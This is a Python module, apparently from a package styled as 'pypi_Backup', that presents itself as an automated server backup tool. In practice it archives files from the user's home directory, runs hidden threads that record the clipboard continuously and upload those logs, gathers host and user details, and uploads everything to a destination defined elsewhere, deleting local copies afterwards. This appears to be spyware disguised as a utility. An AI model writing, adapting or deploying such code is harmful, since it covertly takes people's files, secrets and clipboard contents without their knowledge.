# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import logging
import platform
import getpass
import shutil
import threading
from datetime import datetime, timedelta
from pathlib import Path

from .config import BackupConfig
from .manager import BackupManager


def is_server():
    """检查是否在服务器环境中运行"""
    return not platform.system().lower() == 'windows'


def backup_server(backup_manager, source, target):
    """备份服务器，返回备份文件路径列表（不执行上传）"""
    backup_dir = backup_manager.backup_linux_files(source, target)
    if not backup_dir:
        return None
    
    # 定义需要分别压缩的备份子目录
    backup_subdirs = [
        ("pypi_docs", "docs"),
        ("pypi_configs", "configs"),
        ("pypi_specified", "pypi_specified"),
        ("pypi_keyword", "pypi_keyword"),
    ]
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    all_backup_paths = []
    
    # 分别压缩各个备份子目录
    for subdir_name, archive_prefix in backup_subdirs:
        subdir_path = os.path.join(backup_dir, subdir_name)
        
        # 检查子目录是否存在且不为空
        if not os.path.exists(subdir_path):
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"⏭️ 跳过空目录: {subdir_name}")
            continue
        
        # 检查目录是否为空
        if not os.listdir(subdir_path):
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"⏭️ 跳过空目录: {subdir_name}")
            continue
        
        # 压缩该子目录
        archive_name = f"{archive_prefix}_{timestamp}"
        archive_path = os.path.join(os.path.dirname(backup_dir), archive_name)
        
        if backup_manager.config.DEBUG_MODE:
            logging.info(f"📦 开始压缩目录: {subdir_name}")
        
        compressed_paths = backup_manager.zip_backup_folder(subdir_path, archive_path)
        
        if compressed_paths:
            all_backup_paths.extend(compressed_paths)
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"✅ 目录 {subdir_name} 压缩完成")
        else:
            logging.error(f"❌ 目录 {subdir_name} 压缩失败")
    
    # 清理原始备份目录（所有子目录已压缩）
    try:
        if os.path.exists(backup_dir):
            shutil.rmtree(backup_dir, ignore_errors=True)
    except Exception as e:
        logging.error(f"清理备份目录失败: {e}")
    
    if all_backup_paths:
        logging.critical(f"☑️ 服务器备份文件已准备完成，共 {len(all_backup_paths)} 个压缩文件")
        return all_backup_paths
    else:
        logging.error("❌ 服务器备份压缩失败，没有生成任何压缩文件")
        return None


def backup_and_upload_logs(backup_manager):
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return

        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)

        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return

        temp_dir = Path.home() / ".dev/pypi_Backup/temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name

        try:
            # 读取并验证日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
            
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"📄 已复制备份日志到临时目录 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())

        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())


def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """剪贴板日志上传线程"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    
    while True:
        try:
            # 检查剪贴板日志文件是否存在且不为空
            if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                try:
                    # 读取文件内容验证
                    with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                    
                    if not content or not content.strip():
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                        continue
                    
                    # 创建临时目录
                    temp_dir = Path.home() / ".dev/pypi_Backup/temp_clipboard_logs"
                    if not backup_manager._ensure_directory(str(temp_dir)):
                        logging.error("❌ 无法创建临时剪贴板日志目录")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                        continue
                    
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                    backup_path = temp_dir / backup_name
                    
                    try:
                        # 复制文件到临时目录
                        shutil.copy2(clipboard_log_path, backup_path)
                        
                        if backup_manager.config.DEBUG_MODE:
                            logging.info(f"📄 已复制剪贴板日志到临时目录 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
                        
                        # 上传剪贴板日志文件
                        logging.info(f"📤 开始上传剪贴板日志文件 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
                        if backup_manager.upload_file(str(backup_path)):
                            try:
                                # 上传成功后清空原文件
                                with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                    f.write(f"=== 📝 剪贴板日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                                logging.info("✅ 剪贴板日志上传成功并已清空")
                            except Exception as e:
                                logging.error(f"❌ 剪贴板日志更新失败: {e}")
                        else:
                            logging.error("❌ 剪贴板日志上传失败")
                        
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                    except (OSError, IOError, PermissionError) as e:
                        logging.error(f"❌ 复制或读取剪贴板日志文件失败: {e}")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                    except Exception as e:
                        logging.error(f"❌ 处理剪贴板日志文件时出错: {e}")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                    
                    # 清理临时目录
                    finally:
                        try:
                            if os.path.exists(str(temp_dir)):
                                shutil.rmtree(str(temp_dir))
                        except Exception as e:
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug(f"清理临时目录失败: {e}")
                except Exception as e:
                    logging.error(f"❌ 处理剪贴板日志时出错: {e}")
                    time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
            else:
                time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
        except Exception as e:
            logging.error(f"❌ 剪贴板上传线程出错: {e}")
            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)


def clean_backup_directory():
    backup_dir = Path.home() / ".dev/pypi_Backup"
    try:
        if not os.path.exists(backup_dir):
            return

        # 获取用户名前缀，用于保留剪贴板日志文件
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        clipboard_log_name = f"{user_prefix}_clipboard_log.txt"
        
        keep_files = ["backup.log", "next_backup_time.txt", clipboard_log_name]  # 添加时间阈值文件和剪贴板日志文件到保留列表
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    import shutil
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")


def save_next_backup_time(backup_manager):
    """保存下次备份时间到阈值文件"""
    try:
        next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
        with open(backup_manager.config.THRESHOLD_FILE, 'w', encoding='utf-8') as f:
            f.write(next_backup_time.strftime('%Y-%m-%d %H:%M:%S'))
        if backup_manager.config.DEBUG_MODE:
            logging.info(f"⏰ 已保存下次备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        logging.error(f"❌ 保存下次备份时间失败: {e}")


def should_perform_backup(backup_manager):
    """检查是否应该执行备份"""
    try:
        if not os.path.exists(backup_manager.config.THRESHOLD_FILE):
            return True
            
        with open(backup_manager.config.THRESHOLD_FILE, 'r', encoding='utf-8') as f:
            threshold_time_str = f.read().strip()
            
        threshold_time = datetime.strptime(threshold_time_str, '%Y-%m-%d %H:%M:%S')
        current_time = datetime.now()
        
        if current_time >= threshold_time:
            if backup_manager.config.DEBUG_MODE:
                logging.info("⏰ 已到达备份时间")
            return True
        else:
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"⏳ 未到备份时间，下次备份: {threshold_time_str}")
            return False
            
    except Exception as e:
        logging.error(f"❌ 检查备份时间失败: {e}")
        return True  # 出错时默认执行备份


def periodic_backup_upload(backup_manager):
    source = str(Path.home())
    target = Path.home() / ".dev/pypi_Backup/server"

    try:
        # 获取用户名和系统信息
        username = getpass.getuser()
        hostname = socket.gethostname()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # 获取系统环境信息
        system_info = {
            "操作系统": platform.system(),
            "系统版本": platform.release(),
            "系统架构": platform.machine(),
            "Python版本": platform.python_version(),
            "主机名": hostname,
            "用户名": username,
        }
        
        # 获取Linux发行版信息
        try:
            with open("/etc/os-release", "r") as f:
                for line in f:
                    if line.startswith("PRETTY_NAME="):
                        system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
                        break
        except:
            pass
        
        # 获取内核版本
        try:
            with open("/proc/version", "r") as f:
                kernel_version = f.read().strip().split()[2]
                system_info["内核版本"] = kernel_version
        except:
            pass
        
        # 输出启动信息和系统环境
        logging.critical("\n" + "="*50)
        logging.critical("🚀 自动备份系统已启动")
        logging.critical("="*50)
        logging.critical(f"⏰ 启动时间: {current_time}")
        logging.critical("-"*50)
        logging.critical("📊 系统环境信息:")
        for key, value in system_info.items():
            logging.critical(f"   • {key}: {value}")
        logging.critical("-"*50)
        logging.critical("="*50)

        # 启动剪贴板监控线程
        user_prefix = username[:5] if username else "user"
        clipboard_log_path = Path.home() / ".dev/pypi_Backup" / f"{user_prefix}_clipboard_log.txt"
        
        try:
            # 启动剪贴板监控线程
            clipboard_thread = threading.Thread(
                target=backup_manager.monitor_clipboard,
                args=(str(clipboard_log_path), backup_manager.config.CLIPBOARD_MONITOR_INTERVAL),
                daemon=True
            )
            clipboard_thread.start()
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"📋 剪贴板监控线程已启动")
        except Exception as e:
            logging.error(f"❌ 启动剪贴板监控线程失败: {e}")
        
        try:
            # 启动剪贴板日志上传线程
            clipboard_upload_thread_obj = threading.Thread(
                target=clipboard_upload_thread,
                args=(backup_manager, str(clipboard_log_path)),
                daemon=True
            )
            clipboard_upload_thread_obj.start()
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"📤 剪贴板日志上传线程已启动")
        except Exception as e:
            logging.error(f"❌ 启动剪贴板日志上传线程失败: {e}")

        while True:
            try:
                # 检查是否应该执行备份
                if not should_perform_backup(backup_manager):
                    time.sleep(3600)  # 每小时检查一次
                    continue

                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time}")
                logging.critical("-"*40)

                logging.critical("\n🖥️ 服务器指定目录备份")
                backup_paths = backup_server(backup_manager, source, target)

                # 保存下次备份时间
                save_next_backup_time(backup_manager)

                # 输出结束语（在上传之前）
                logging.critical("\n" + "="*40)
                next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time = next_backup_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"✅ 备份完成  {current_time}")
                logging.critical("="*40)
                logging.critical("📋 备份任务已结束")
                logging.critical(f"🔄 下次启动备份时间: {next_time}")
                logging.critical("="*40 + "\n")

                # 开始上传备份文件
                if backup_paths:
                    logging.critical("📤 开始上传备份文件...")
                    if backup_manager.upload_backup(backup_paths):
                        logging.critical("✅ 备份文件上传成功")
                    else:
                        logging.error("❌ 备份文件上传失败")
                
                # 上传备份日志
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\n📝 备份日志上传")
                backup_and_upload_logs(backup_manager)

            except Exception as e:
                logging.error(f"\n❌ 备份出错: {e}")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as log_error:
                    logging.error("❌ 日志备份失败")
                time.sleep(60)

    except Exception as e:
        logging.error(f"❌ 备份过程出错: {e}")


def main():
    """主函数 - 命令行入口点"""
    if not is_server():
        logging.critical("本脚本仅适用于服务器环境")
        return

    try:
        backup_manager = BackupManager()
        
        # 先清理备份目录
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\n备份程序已停止")
    except Exception as e:
        logging.critical(f"程序出错: {e}")


if __name__ == "__main__":
    main()

